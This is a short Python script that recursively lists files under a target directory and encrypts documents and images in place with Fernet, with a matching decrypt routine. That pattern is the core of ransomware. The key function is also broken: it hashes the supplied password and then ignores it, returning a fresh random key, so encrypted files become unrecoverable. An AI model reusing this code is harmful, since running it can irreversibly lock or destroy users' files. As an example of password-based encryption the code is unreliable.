from cryptography.fernet import Fernet
import os
import hashlib

def generate_key(password):
    hashed = hashlib.sha256(password.encode()).digest()
    return Fernet(Fernet.generate_key())

def encrypt_file(file_path, key):
    try:
        if file_path.endswith(('.txt', '.jpg', '.png', '.pdf', '.docx')):  # filter aman
            with open(file_path, 'rb') as file:
                data = file.read()
            encrypted = key.encrypt(data)
            with open(file_path, 'wb') as file:
                file.write(encrypted)
            return True
    except:
        return False
    return False

def decrypt_file(file_path, key):
    try:
        if file_path.endswith(('.txt', '.jpg', '.png', '.pdf', '.docx')):
            with open(file_path, 'rb') as file:
                data = file.read()
            decrypted = key.decrypt(data)
            with open(file_path, 'wb') as file:
                file.write(decrypted)
            return True
    except:
        return False
    return False

def get_all_files(target_dir):
    all_files = []
    for root, _, files in os.walk(target_dir):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files
